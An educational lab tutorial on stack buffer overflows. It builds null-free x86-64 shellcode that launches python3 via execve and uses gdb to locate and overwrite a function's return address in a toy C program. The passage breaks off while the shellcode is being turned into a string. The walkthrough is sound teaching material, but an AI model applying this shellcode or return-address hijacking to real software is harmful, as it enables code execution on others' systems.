# 10. Lab: Buffer overflow

## Instructions

1. Perform a buffer overflow attack in a simple program.

## More information

## Detailed instructions

### 1. Buffer overflow

We will perform a buffer overflow attack in a simple program that is described in more detail in the article [Smashing the stack for fun and profit](https://www.eecs.umich.edu/courses/eecs588/static/stack_smashing.pdf).

Today we use preemptive multitasking operating systems. Preemptive multitasking is a process in which a computer's operating system uses certain criteria to decide how long any program can use the operating system before another program also gets a chance to use the operating system.

The act of taking over the use of the operating system between one program and another is called preemption. A common criterion for preemption is simply the elapsed time of program execution. In some operating systems, some programs can be given higher priority than other programs, which gives them control over when they get access and for how long they have access to the operating system.

In a computer, we have [external devices, memory, and a processor](https://en.wikipedia.org/wiki/Von_Neumann_architecture) that executes programs from memory. In a processor, [instruction pointer (IP) or program counter (PC)](https://en.wikipedia.org/wiki/Program_counter) points to a cell in memory containing the current instruction of the selected program, which is being run.

The processor can be interrupted by external devices. One such device is a clock, which in practice often triggers an [interrupt](https://en.wikipedia.org/wiki/Interrupt) of the execution of the current program. At a certain interrupt, the processor can jump to a piece of program code that represents the operating system, which includes, among other things, the [process table](https://www.geeksforgeeks.org/process-table-and-process-control-block-pcb/ ).

The process table has a unique identifier for each process and data about the process, which includes, among other things, the location of the command in memory where the process was last stopped.

At the clock interrupt, the execution of the current process is interrupted and the processor jumps to the execution of the operating system program code, which looks in the process table, which process will be executed next and sets the program counter to the location of the last command at which the process was stopped during the previous execution. Thus, the processor now starts the execution of a new process from the point where it previously stopped.

When a process wants to read a file, it executes a special file read command that stops the process execution and asks the operating system for the file. After the operating system loads the requested file into memory, it then restarts the execution of the process, of course, only after it has had its turn from other processes. While the process was stopped and waiting for the file, the operating system left the execution to other processes.

When a process wants to perform certain functionality provided by the operating system, it executes a system call (`syscall`) command. For example, to open a file, write to a file, open a network connection, run a program...

The command to make a system call is [`INT 0x80`](https://blog.packagecloud.io/the-definitive-guide-to-linux-system-calls/) on Intel 32-bit processors running 32-bit operating system. `INT` specifies the interrupt, and `0x80` the interrupt number, which in this case moves the system call.

In the case of 32-bit operating systems, we activate the `int` interrupt for the system call, for which we specify in the `eax` register the number of the system call we want to perform and the parameters in the other registers (`ebx`, `ecx`, `edx`, `esi ` and `edi`) or we transfer them via the stack. System calls are predefined and described in [32-bit system calls table](https://syscalls.w3challs.com/?arch=x86).

In the case of 64-bit operating systems, we do not activate the interrupt anymore, but we call the `syscall` command and give it the number of the system call we want to perform in the `rax` register, and the parameters follow in the other registers (`rdi`, `rsi`, ` rdx`, `r1`, `r8` and `r9`). System calls are described in the [64-bit system call table](https://syscalls.w3challs.com/?arch=x86_64).

Now let's write a program in the C programming language that will run some other program. It can only run another program via a system call [`exec`](https://en.wikipedia.org/wiki/Exec_(system_call)).

In general, we run the program like this `program file1 -d rw 1` and at startup the program has the following things specified:

- List of arguments (`args`), where the first argument with index zero always represents the name of the program: [`program`, `file1`, `-d`, `rw`, `1`].
- Three standard files (`file descriptors`) are opened: 0 - standard input (`stdin`), 1 - standard output (`stdout`) and 2 - standard error output (`stderr`).
- Environment variables of the environment in which the program is executed (`env`).

Let's write a short program in the C programming language that will run the command shell of the `python` programming language. Since we want to follow the general execution of the programs, we choose the `execve` function to run another program from within the program itself:

`int execve(char const *path, char const *argv[], char const *envp[]);`

    nano program.c

    #include <unistd.h>

    int main(int argc, char *argv[]) {
        execve("/usr/bin/python3", NULL, NULL);
        return 0;
    }

Now compile the program with the command [`gcc`](https://manpages.org/gcc) and run it to check if it works.

    apt update
    apt install build-essential

    gcc program.c -o program
    ./program

In the `python` programming language, system calls can be called via the `sys` library. Now let's look at the code of our assembly language program.

    gcc program.c -S -o program.S
    ./program

    less program.S

        .file   "program.c"
        .text
        .section        .rodata
    .LC0:
        .string "/usr/bin/python3"
        .text
        .globl  main
        .type   main, @function
    main:
    .LFB0:
        .cfi_startproc
        pushq   %rbp
        .cfi_def_cfa_offset 16
        .cfi_offset 6, -16
        movq    %rsp, %rbp
        .cfi_def_cfa_register 6
        subq    $16, %rsp
        movl    %edi, -4(%rbp)
        movq    %rsi, -16(%rbp)
        movl    $0, %edx
        movl    $0, %esi
        leaq    .LC0(%rip), %rax
        movq    %rax, %rdi
        call    execve@PLT
        movl    $0, %eax
        leave
        .cfi_def_cfa 7, 8
        ret
        .cfi_endproc
    .LFE0:
        .size   main, .-main
        .ident  "GCC: (Debian 12.2.0-14) 12.2.0"
        .section        .note.GNU-stack,"",@progbits

The main commands in the code are:

- `.LC0` - A tag that represents a symbolic name for the address in memory of the string `"/usr/bin/python3"` on the next line.
- `.string "/usr/bin/python3"` - A directive that defines a string constant that contains the value `"/usr/bin/python3"` and ends with the character `\0`.
- `.LFB0` - A tag that specifies the start of the function.
- `pushq	%rbp` - A command that loads the current value of the base pointer register of the caller of this function (`%rbp`) onto the stack.
- `movq	%rsp, %rbp` - A command that moves the value of the stack pointer register (`%rsp`) into the base pointer register (`%rbp`). This sets the starting point for the stack frame of the `main` function.
- `subq	$16, %rsp` - A command that subtracts 16 from the value of the stack pointer register (`%rsp`). This makes 16 bytes of space available for local variables within the `main` function.
- `movl	%edi, -4(%rbp)` - A command that loads the value of the `%edi` register into memory, 4 bytes below the memory address stored in `%rbp`. The `%edi` register contains the value of the first argument passed to the `main` function, which represents `argc`, i.e. the number of arguments.
- `movq	%rsi, -16(%rbp)` - A command that loads the value of the `%rsi` register into memory, 16 bytes below the memory address stored in `%rbp`. The `%rsi` register contains the value of the second argument passed to the `main` function, which represents `argv`, i.e. the pointer to the argument table in memory.
- `movl	$0, %edx` - A command that sets the value of the `%edx` register to 0. This sets the value of the `envp` argument of the `execve` system call to `NULL`.
- `movl	$0, %esi` - A command that sets the value of the `%esi` register to 0. This sets the value of the `argv` argument of the `execve` system call to `NULL`.
- `leaq	.LC0(%rip), %rax` - A command that loads the effective address of the `.LC0` tag (relative to the current address pointed to by the `%rip` command pointer) into the `%rax` register. It therefore calculates the address in memory where the string `"/usr/bin/python3"` is located and loads it into `%rax`. Relative addressing using the `%rip` command pointer makes the code independent of its location in memory.
- `movq	%rax, %rdi` - A command that loads the address of the string `"/usr/bin/python3"` from `%rax` to `%rdi`. This sets the value of the `pathname` argument of the `execve` system call to `"/usr/bin/python3"`.
- `call	execve@PLT` - A command that executes the `execve` function with the arguments provided in `%rdi` - `pathname` - `"/usr/bin/python3"`, `%esi` - `argv` - `NULL` and `%edx` - `envp` - `NULL`. The `@PLT` flag causes `call` to go through the [PLT table (Procedure Linkage Table)](https://refspecs.linuxfoundation.org/ELF/zSeries/lzsabi0_zSeries/x2251.html), which allows for dynamic linking of library functions. If the call is `execve`, the program does not return, so the remaining instructions are only executed if the call fails.
- `movl	$0, %eax` - A command that loads the value zero into the `%eax` register. This sets the value returned by the `main` function to 0.
- `leave` - A command that loads the value of the base pointer register (`%rbp`) back into the stack pointer register (`%rsp`), effectively removing local stack space and then loading the base pointer of the program that called the `main` function from the stack into the base pointer register `%rbp` (equivalent to the command `movq	%rbp, %rsp` followed by `popq	%rbp`).

The `call` command executes the `exec` system call, which is defined in the system library, which then executes the system call. We will replace it with an interrupt and set the correct values ​​in the registers to directly execute the same system call:
- The `movl $0, %edx` command to set `envp` now sets the `%rdx` register -> `mov $0, %rdx`.
- The `movl $0, %esi` command to set `argv` now sets the `%rsi` register -> `mov $0, %rsi`.
- The `.LC0(%rip), %rax` command to set `pathname` now sets the `rdi` register -> `.LC0(%rip), %rdi`.
- We add the `mov $59, %rax` command, which sets the value 59 in the `%rax` register, which represents the `execve` system call.
- We replace the line `call execve@PLT` with `syscall`.

Now let's recompile the program and test its operation.

   nano program.S

    	.file	"program.c"
        .text
        .section	.rodata
    .LC0:
        .string	"/usr/bin/python3"
        .text
        .globl	main
        .type	main, @function
    main:
    .LFB0:
        .cfi_startproc
        pushq	%rbp
        .cfi_def_cfa_offset 16
        .cfi_offset 6, -16
        movq	%rsp, %rbp
        .cfi_def_cfa_register 6
        subq	$16, %rsp
        movl	%edi, -4(%rbp)
        movq	%rsi, -16(%rbp)

        leaq	.LC0(%rip), %rdi
        mov	    $0, %rsi
        mov	    $0, %rdx
        mov	    $59, %rax
        syscall

        movl	$0, %eax
        leave
        .cfi_def_cfa 7, 8
        ret
        .cfi_endproc
    .LFE0:
        .size   main, .-main
        .ident  "GCC: (Debian 12.2.0-14) 12.2.0"
        .section        .note.GNU-stack,"",@progbits

    gcc program.S -o program
    ./program

We now want to represent this program as a string so that we can pass it to any text input and try to convince the program that reads the input to run it. This can only be achieved if we know how the computer's memory works. Memory can be thought of as a large table where each cell has its own address through which we can access it. The cells in the table are arranged in such a way that the cells with low addresses are at the top and the cells with high addresses are at the bottom. By convention, the operating system is located in the lower part of the memory, and programs follow each other from top to bottom.

If we look at the part of memory that represents the program (`Program frame`), it has the program code (`Text`) stored at the top of the memory, followed by constants (`Data` and `Block Started by Symbol`) and two dynamic structures: the heap (`Heap`), which is immediately after the constants, grows upwards and contains the program's internal variables; and the stack (`Stack`), which is located at the top of the program's memory, grows downwards and contains the function's arguments, stack direction variables and the caller's return address.

![](ProgramFrame.drawio.svg)

When a program calls any function, it must store the address of the command in memory at the time of the call, where it must return when the function is executed. In addition to the return address, it stores arguments and global variables. If we are not careful, the return address can be overwritten with another address, which can point to any command in this program's memory. Inside a program, however, we can have a string that contains commands to run another program. The return address is located after the stack itself, so it can be overwritten by manipulating the stack so we can achieve a stack-overflow.

First, we find out more precisely where the return address is located, so we add a jump to any function in our program and a return from the function back to the program. Delete the `leaq` command in the program, as we will specify the string directly. Then we jump to the part of the `jumppoint` program that makes a call to the function `myfunction`. When the function is called, the address of the next command is put on the stack and then it is popped from the stack into register `%rdi`, so that we can return back.

    nano program.S

    	.file	"program.c"
        .text
        .section	.rodata
    .LC0:
        .string	"/usr/bin/python3"
        .text
        .globl	main
        .type	main, @function
    main:
    .LFB0:
        .cfi_startproc
        pushq	%rbp
        .cfi_def_cfa_offset 16
        .cfi_offset 6, -16
        movq	%rsp, %rbp
        .cfi_def_cfa_register 6
        subq	$16, %rsp
        movl	%edi, -4(%rbp)
        movq	%rsi, -16(%rbp)

        jmp     jumppoint
    myfunction:
        pop     %rdi
        mov	    $0, %rsi
        mov	    $0, %rdx
        mov	    $59, %rax
        syscall
    jumppoint:
        call    myfunction
        .string	"/usr/bin/python3"

        movl	$0, %eax
        leave
        .cfi_def_cfa 7, 8
        ret
        .cfi_endproc
    .LFE0:
        .size   main, .-main
        .ident  "GCC: (Debian 12.2.0-14) 12.2.0"
        .section        .note.GNU-stack,"",@progbits

    gcc program.S -o program
    ./program

Since our program will be presented as a string, it must not contain any zeros, because the general functions for reading strings in the programming language C expect a special end character at the end of the string to know when to stop reading. And that special trailing character contains a zero (`\0`). Therefore, we replace all commands that directly write zeros to registers with the logical XOR operation. In the case when we write the value 59 in the `rax` register, we cannot use it, so we first set the register to zero by using the logical XOR operation and then write the value 59 only in the lower byte of the register (the lower 8 bits of the `rax` registry can be accessed via the `al` register), since they are not added during translation zeros before the value 59 to the full length of the register.

    nano program.S

    	.file	"program.c"
        .text
        .section	.rodata
    .LC0:
        .string	"/usr/bin/python3"
        .text
        .globl	main
        .type	main, @function
    main:
    .LFB0:
        .cfi_startproc
        pushq	%rbp
        .cfi_def_cfa_offset 16
        .cfi_offset 6, -16
        movq	%rsp, %rbp
        .cfi_def_cfa_register 6
        subq	$16, %rsp
        movl	%edi, -4(%rbp)
        movq	%rsi, -16(%rbp)

        jmp     jumppoint
    myfunction:
        pop     %rdi
        xor	    %rsi, %rsi
        xor	    %rdx, %rdx
        xor     %rax, %rax
        mov	    $59, %al
        syscall
    jumppoint:
        call    myfunction
        .string	"/usr/bin/python3"

        movl	$0, %eax
        leave
        .cfi_def_cfa 7, 8
        ret
        .cfi_endproc
    .LFE0:
        .size   main, .-main
        .ident  "GCC: (Debian 12.2.0-14) 12.2.0"
        .section        .note.GNU-stack,"",@progbits

    gcc program.S -o program
    ./program

So we have a program that we can pass as a string to another program that will run some other program, in our case the `python` interpreter. Now let's write a program that will receive this string in such a way that it overflows the stack. So we will perform a stack overflow attack. Let's write a simple program in the C programming language.

    nano stacky.c

    #include <stdio.h>

    int callme(int a, unsigned long *b){
        unsigned long *f;
        /* Add something here so that we jump over line: c = c + e */
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);		// e == 11
        c = c + e; 				// c == 16
        printf("c: %d\n", c);	
        return 0;
    }

    gcc stacky.c -o stacky
    ./stacky
    
    c: 16

We want, when returning from the function, to jump directly to the `printf` command and thus skip the line `c = c + e;`. We will achieve this by corrupting the stack. To find out what our `stacky` program compiles to and how it is executed, we can enable debugging with [Debugger GDB](https://sourceware.org/gdb/). The interactive environment for debugging is called with the command [`gdb`](https://manpages.org/gdb) and then with the command `run` we run the program, with the command `break` we set the point where the execution stops, with the command `s` we move to the next command and the command `disassemble` shows us the code in assembly language.

    apt update
    apt install gdb

    gcc stacky.c -g -o stacky

    gdb stacky

    Reading symbols from stacky...
    (gdb) run
    Starting program: /home/aleks/stacky 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    c: 16
    [Inferior 1 (process 2872) exited normally]
    (gdb) break main
    Breakpoint 1 at 0x55555555515c: file stacky.c, line 12.
    (gdb) run
    Starting program: /home/aleks/stacky 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, main () at stacky.c:12
    12	        c = 5;
    (gdb) s
    13	        d = 3;
    (gdb) disassemble callme
    Dump of assembler code for function callme:
        0x0000555555555139 <+0>:	push   %rbp
        0x000055555555513a <+1>:	mov    %rsp,%rbp
        0x000055555555513d <+4>:	mov    %edi,-0x4(%rbp)
        0x0000555555555140 <+7>:	mov    %rsi,-0x10(%rbp)
        0x0000555555555144 <+11>:	mov    -0x10(%rbp),%rax
        0x0000555555555148 <+15>:	mov    (%rax),%rax
        0x000055555555514b <+18>:	mov    %eax,%edx
        0x000055555555514d <+20>:	mov    -0x4(%rbp),%eax
        0x0000555555555150 <+23>:	add    %edx,%eax
        0x0000555555555152 <+25>:	pop    %rbp
        0x0000555555555153 <+26>:	ret
    End of assembler dump.

When we get to the `callme` function, we have the address stored on the stack to which we must return after the function is completed (return address). The function commands are:

- The `push %rbp` command stores the old value in the `%rbp` register on the stack. This command decreases the value of `%rsp` by 4.
- The `mov  %rsp,%rbp` command stores the value of the `%rsp` register in the `%rbp` register. The general `%rbp` register (base pointer) points to the beginning of local variables or the beginning of the local stack. The `%rsp` register (stack pointer) also points to the beginning of the local stack and is implicitly corrected by the `push` and `pop` stack commands.
- The `mov  %edi,-0x4(%rbp)` command loads the value from the `%edi` register into memory at an address that is 4 bytes smaller than the address stored in `%rbp`. The `%edi` register holds the first argument of the `callme` function, namely the variable `a`, which is a 32-bit integer.
- The `%mov rsi,-0x10(%rbp)` instruction loads the value from the `%rsi` register into memory at an address 16 bytes smaller than the address held by `%rbp`. The `%rsi` register holds the second argument of the `callme` function, namely a pointer to the variable `b`, which is a 64-bit unsigned integer.
- The `mov  -0x10(%rbp),%rax` instruction moves the pointer to the variable `b` from the address `(%rbp - 0x10)` in memory to the `%rax` register.
- The `mov  (%rax),%rax` instruction reads the value of the variable pointer into `%rax` and reads the actual value from the memory address it points to and stores it in `%rax`.
- The `mov  %eax,%edx` command loads the lower 32-bits of the `%rax` register (`%eax`) into the lower 32-bits of the `%rdx` register (`%edx`).
- The `mov  -0x4(%rbp),%eax` command moves the variable `a` from the address `(%rbp - 0x4)` in memory to the `%eax` register.
- The `add  %edx,%eax` command adds the values ​​in the `%eax` and `%edx` registers and stores the result in the `%eax` register.
- The `pop  %rbp` command pops the caller's base pointer from the stack and loads it into the `%rbp` register, implicitly incrementing the `%rsp` stack pointer.
- The `ret` command loads the return address from the top of the stack, where the caller loaded it when calling the `callme` function, and jumps to the read address. The `%eax` register holds the value returned by the `callme` function.

A stack frame is the part of the stack that is relevant to the current function and contains at least:

- the caller's return address,
- the caller's old frame pointer (`%rsp`);

and may also contain:

- local variables,
- function arguments,
- stored register values, and
- temporary values.

We want to change the operation of the program by injecting a piece of code that will run over the return address that is stored on the stack. We need to find out where the return address points to, what is happening in the main program, and find out by how much we need to correct the return address. In order to do this, we need to supplement our program. We add the constant `X` to it, which represents the offset from the address of the variable `a` to the address of the return address, i.e. 8 bytes below the value in the `rsp` register.

We add the following line `f = (unsigned long*)(((char*)&a) + X);`, where `&a` returns the address in memory where the local variable `a` is located, which is located in the current stack frame. We then change the address from `int*` to `char*` with `(char*)&a`, so that we can increment the address 1 byte at a time and not 4 bytes at a time. We then increment the address by the correct number of bytes `X` and convert it to an unsigned integer pointer with the command `(unsigned long*)` and assign the result to the pointer `f`.

So `f` now points to the address in memory where the return address of the caller of the `callme` function is located. We also add the following line `*f = *f + Y; `, which fixes the return address for `Y`, which is just right, so that after returning from the `callme` function, we skip the line `c = c + e;` and start executing the line `printf("c: %d\n", c);`.

    nano stacky.c

    #include <stdio.h>

    #define X 0
    #define Y 0

    int callme(int a, unsigned long *b){
        unsigned long *f;
        f = (unsigned long*)(((char*)&a) + X);	// Override return address.
        *f = *f + Y;				            // Jump over the line c = c + e.
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);		// e == 11
        c = c + e; 				// c == 16
        printf("c: %d\n", c);	
        return 0;
    }

Now let's use the `gdb` debugger to determine the `X` and `Y` constants. First, we will fix the line `f = (unsigned long*)(((char*)&a) + X);` so that the variable `f` will contain the address in memory where the return address is located. Let's set a breakpoint with the `break` command at the beginning of the `callme` function. We then execute a couple of lines of function with the `s` command to get the correct value into the `rsp` register. Now we can print the program code of the main program in the assembler with the command `disassemble`. The `callme` function is called with the line `call 0x555555555139 <callme> ` and the return address points to the next line of `cltq` with the address `0x00005555555551a7`.

To print the value, use the command `p` with the flag for hexadecimal output `/x` and print the return address in memory at the address that is 8 bytes after the address where the `rsp` register points, which must be the same as the address of the `cltq` line in the main part of the program. In the variable `f` we need to store the value located 8 bytes above `rsp`. We calculate the difference between the address `&a` and the address located 8 bytes above `rsp` which is 28 and store it in the constant `X`. So if we add 28 to the address `&a`, we get the address that points to the return address.

    gcc stacky.c -g -o stacky

    gdb stacky.c

    Reading symbols from stacky...
    (gdb) break callme
    Breakpoint 1 at 0x1144: file stacky.c, line 8.
    (gdb) run
    Starting program: /home/aleks/stacky 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, callme (a=3, b=0x7fffffffe050) at stacky.c:8
    8	        f = (unsigned long*)(((char*)&a) + X);	// Override return address.
    (gdb) s
    9	        *f = *f + Y;
    (gdb) s
    10	        return a + *b;
    (gdb) disassemble main 
    Dump of assembler code for function main:
        0x0000555555555172 <+0>:	push   %rbp
        0x0000555555555173 <+1>:	mov    %rsp,%rbp
        0x0000555555555176 <+4>:	sub    $0x10,%rsp
        0x000055555555517a <+8>:	movl   $0x5,-0x4(%rbp)
        0x0000555555555181 <+15>:	movl   $0x3,-0x8(%rbp)
        0x0000555555555188 <+22>:	mov    -0x4(%rbp),%edx
        0x000055555555518b <+25>:	mov    -0x8(%rbp),%eax
        0x000055555555518e <+28>:	add    %edx,%eax
        0x0000555555555190 <+30>:	cltq
        0x0000555555555192 <+32>:	mov    %rax,-0x10(%rbp)
        0x0000555555555196 <+36>:	lea    -0x10(%rbp),%rdx
        0x000055555555519a <+40>:	mov    -0x8(%rbp),%eax
        0x000055555555519d <+43>:	mov    %rdx,%rsi
        0x00005555555551a0 <+46>:	mov    %eax,%edi
        0x00005555555551a2 <+48>:	call   0x555555555139 <callme>
        0x00005555555551a7 <+53>:	cltq
        0x00005555555551a9 <+55>:	mov    %rax,-0x10(%rbp)
        0x00005555555551ad <+59>:	mov    -0x10(%rbp),%rax
        0x00005555555551b1 <+63>:	mov    %eax,%edx
        0x00005555555551b3 <+65>:	mov    -0x4(%rbp),%eax
        0x00005555555551b6 <+68>:	add    %edx,%eax
        0x00005555555551b8 <+70>:	mov    %eax,-0x4(%rbp)
        0x00005555555551bb <+73>:	mov    -0x4(%rbp),%eax
        0x00005555555551be <+76>:	mov    %eax,%esi
        0x00005555555551c0 <+78>:	lea    0xe3d(%rip),%rax        # 0x555555556004
        0x00005555555551c7 <+85>:	mov    %rax,%rdi
        0x00005555555551ca <+88>:	mov    $0x0,%eax
        0x00005555555551cf <+93>:	call   0x555555555030 <printf@plt>
        0x00005555555551d4 <+98>:	mov    $0x0,%eax
        0x00005555555551d9 <+103>:	leave
        0x00005555555551da <+104>:	ret
    End of assembler dump.
    (gdb) p/x *(unsigned long*)($rsp+8) 
    $1 = 0x5555555551a7
    (gdb) disassemble callme
    Dump of assembler code for function callme:
        0x0000555555555139 <+0>:	push   %rbp
        0x000055555555513a <+1>:	mov    %rsp,%rbp
        0x000055555555513d <+4>:	mov    %edi,-0x14(%rbp)
        0x0000555555555140 <+7>:	mov    %rsi,-0x20(%rbp)
        0x0000555555555144 <+11>:	lea    -0x14(%rbp),%rax
        0x0000555555555148 <+15>:	add    $0x42,%rax
        0x000055555555514c <+19>:	mov    %rax,-0x8(%rbp)
        0x0000555555555150 <+23>:	mov    -0x8(%rbp),%rax
        0x0000555555555154 <+27>:	mov    (%rax),%rax
        0x0000555555555157 <+30>:	lea    0x42(%rax),%rdx
        0x000055555555515b <+34>:	mov    -0x8(%rbp),%rax
        0x000055555555515f <+38>:	mov    %rdx,(%rax)
        => 0x0000555555555162 <+41>:	mov    -0x20(%rbp),%rax
        0x0000555555555166 <+45>:	mov    (%rax),%rax
        0x0000555555555169 <+48>:	mov    %eax,%edx
        0x000055555555516b <+50>:	mov    -0x14(%rbp),%eax
        0x000055555555516e <+53>:	add    %edx,%eax
        0x0000555555555170 <+55>:	pop    %rbp
        0x0000555555555171 <+56>:	ret
    End of assembler dump.
    (gdb)  p $rsp+8
    $2 = (void *) 0x7fffffffe048
    (gdb) p &a 
    $3 = (int *) 0x7fffffffe02c
    (gdb) p (unsigned long)($rsp + 8) - (unsigned long)&a 
    $4 = 28

Now we fix the line `#define X 28` and compile the code and check that the variable `f` contains the return address `0x5555555551a7`, which points to the `cltq` command.

    nano stacky.c

    #include <stdio.h>

    #define X 28
    #define Y 0

    int callme(int a, unsigned long *b){
        unsigned long *f;
        f = (unsigned long*)(((char*)&a) + X);	// Override return address.
        *f = *f + Y;				            // Jump over the line c = c + e.
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);		// e == 11
        c = c + e; 				// c == 16
        printf("c: %d\n", c);	
        return 0;
    }

    gcc stacky.c -g -o stacky

    gdb stacky

    Reading symbols from stacky...
    (gdb) break callme
    Breakpoint 1 at 0x1144: file stacky.c, line 8.
    (gdb) run
    Starting program: /home/aleks/stacky 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, callme (a=3, b=0x7fffffffe050) at stacky.c:8
    8	        f = (unsigned long*)(((char*)&a) + X);	// Override return address.
    (gdb) s
    9	        *f = *f + Y;
    (gdb) s
    10	        return a + *b;
    (gdb) p $rsp+8 
    $1 = (void *) 0x7fffffffe048
    (gdb) p f
    $2 = (unsigned long *) 0x7fffffffe048
    (gdb) p/x *f
    $3 = 0x5555555551a7

The address of the command that indicates the start of the call to the `printf` function can also be found by setting the `Y` variable to 0 and using `gdb` to run our program with the `s` command and stop when we reach the line `printf("c: %d\n", c);` and then print the program code of the `main` function with the `disassemble` command and look at which address the arrow of the current command points to.

    gdb stacky

    Reading symbols from stacky...
    (gdb) break main
    Breakpoint 1 at 0x1176: file stacky.c, line 16.
    (gdb) run
    Starting program: /home/aleks/stacky 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, main () at stacky.c:16
    16	        c = 5;
    (gdb) s
    17	        d = 3;
    (gdb) s
    18	        e = c + d;              // e == 8
    (gdb) s
    19	        e = callme(d, &e);		// e == 11
    (gdb) s
    callme (a=3, b=0x7fffffffe050) at stacky.c:8
    8	        f = (unsigned long*)(((char*)&a) + X);	// Override return address.
    (gdb) s
    9	        *f = *f + Y;
    (gdb) s
    10	        return a + *b;
    (gdb) s
    11	    }
    (gdb) s
    main () at stacky.c:20
    20	        c = c + e; 				// c == 16
    (gdb) s
    21	        printf("c: %d\n", c);	
    (gdb) dis
    disable      disassemble  disconnect   display      
    (gdb) disassemble main
    Dump of assembler code for function main:
        0x0000555555555172 <+0>:	push   %rbp
        0x0000555555555173 <+1>:	mov    %rsp,%rbp
        0x0000555555555176 <+4>:	sub    $0x10,%rsp
        0x000055555555517a <+8>:	movl   $0x5,-0x4(%rbp)
        0x0000555555555181 <+15>:	movl   $0x3,-0x8(%rbp)
        0x0000555555555188 <+22>:	mov    -0x4(%rbp),%edx
        0x000055555555518b <+25>:	mov    -0x8(%rbp),%eax
        0x000055555555518e <+28>:	add    %edx,%eax
        0x0000555555555190 <+30>:	cltq
        0x0000555555555192 <+32>:	mov    %rax,-0x10(%rbp)
        0x0000555555555196 <+36>:	lea    -0x10(%rbp),%rdx
        0x000055555555519a <+40>:	mov    -0x8(%rbp),%eax
        0x000055555555519d <+43>:	mov    %rdx,%rsi
        0x00005555555551a0 <+46>:	mov    %eax,%edi
        0x00005555555551a2 <+48>:	call   0x555555555139 <callme>
        0x00005555555551a7 <+53>:	cltq
        0x00005555555551a9 <+55>:	mov    %rax,-0x10(%rbp)
        0x00005555555551ad <+59>:	mov    -0x10(%rbp),%rax
        0x00005555555551b1 <+63>:	mov    %eax,%edx
        0x00005555555551b3 <+65>:	mov    -0x4(%rbp),%eax
        0x00005555555551b6 <+68>:	add    %edx,%eax
        0x00005555555551b8 <+70>:	mov    %eax,-0x4(%rbp)
    =>  0x00005555555551bb <+73>:	mov    -0x4(%rbp),%eax
        0x00005555555551be <+76>:	mov    %eax,%esi
        0x00005555555551c0 <+78>:	lea    0xe3d(%rip),%rax        # 0x555555556004
        0x00005555555551c7 <+85>:	mov    %rax,%rdi
        0x00005555555551ca <+88>:	mov    $0x0,%eax
        0x00005555555551cf <+93>:	call   0x555555555030 <printf@plt>
        0x00005555555551d4 <+98>:	mov    $0x0,%eax
        0x00005555555551d9 <+103>:	leave
        0x00005555555551da <+104>:	ret
    End of assembler dump.

In our code, the `f` variable now stores the address in memory where the return address is located. Now we will fix the line `*f = *f + Y;` so that the return address will point to the command `printf("c: %d\n", c);` instead of `c = c + e; `. We need to find out which command starts the `printf` function call, because we need to load the correct values into the correct registers before the call. When examining the code in the compiler, we find that the registers for calling the function `printf` start at the command `mov -0x4(%rbp),%eax` at the address `0x5555555551bb`. So `Y` represents the difference between the address of the `cltq` command, which is `0x5555555551a7`, and the address of the `mov -0x4(%rbp),%eax` command, which is `0x5555555551bb`.

    gdb stacky

    Reading symbols from stacky...
    (gdb) p 0x00005555555551bb - 0x00005555555551a7 
    $2 = 20

Now we correct the line `#define Y 20` and compile the code and check whether the program now skips the line `c = c + e;` and returns the result `c = 5`.

    nano stacky.c

    #include <stdio.h>

    #define X 28
    #define Y 20

    int callme(int a, unsigned long *b){
        unsigned long *f;
        f = (unsigned long*)(((char*)&a) + X);  // Override return address.
        *f = *f + Y;
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);              // e == 11
        c = c + e;                              // c == 16
        printf("c: %d\n", c);   
        return 0;
    }

    gcc stacky.c -g -o stacky
    ./stacky
    
    c: 5

The line `f = (unsigned long*)(((char*)&a) + X);` can be simplified by working with 32-bit integers instead of bytes and consequently dividing the value of the constant `X` by 4 to get value 7.

    nano stacky.c

    #include <stdio.h>

    #define X 7
    #define Y 20

    int callme(int a, unsigned long *b){
        unsigned long *f;
        f = (unsigned long*)(&a + X);	// Override return address.
        *f = *f + Y;				    // Jump over the line c = c + e.
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);		// e == 11
        c = c + e; 				// c == 16
        printf("c: %d\n", c);	
        return 0;
    }

    gcc stacky.c -g -o stacky

    ./stacky

    c: 5

Now we will specify our initial program as a string program `stacky.c`. The string is obtained by writing the program in the compiler with the `gdb` tool and writing it as a string from the `jmp    0x114e <main+41>` command up to and including the line after the `call` command.

    gcc program.S -g -o program

    gdb program

    Reading symbols from program...
    (gdb) disassemble main
    Dump of assembler code for function main:
        0x0000000000001129 <+0>:	push   %rbp
        0x000000000000112a <+1>:	mov    %rsp,%rbp
        0x000000000000112d <+4>:	sub    $0x10,%rsp
        0x0000000000001131 <+8>:	mov    %edi,-0x4(%rbp)
        0x0000000000001134 <+11>:	mov    %rsi,-0x10(%rbp)
        0x0000000000001138 <+15>:	jmp    0x1148 <main+31>
        0x000000000000113a <+17>:	pop    %rdi
        0x000000000000113b <+18>:	xor    %rsi,%rsi
        0x000000000000113e <+21>:	xor    %rdx,%rdx
        0x0000000000001141 <+24>:	xor    %rax,%rax
        0x0000000000001144 <+27>:	mov    $0x3b,%al
        0x0000000000001146 <+29>:	syscall
        0x0000000000001148 <+31>:	call   0x113a <main+17>
        0x000000000000114d <+36>:	(bad)
        0x000000000000114e <+37>:	jne    0x11c3
        0x0000000000001150 <+39>:	jb     0x1181
        0x0000000000001152 <+41>:	(bad)
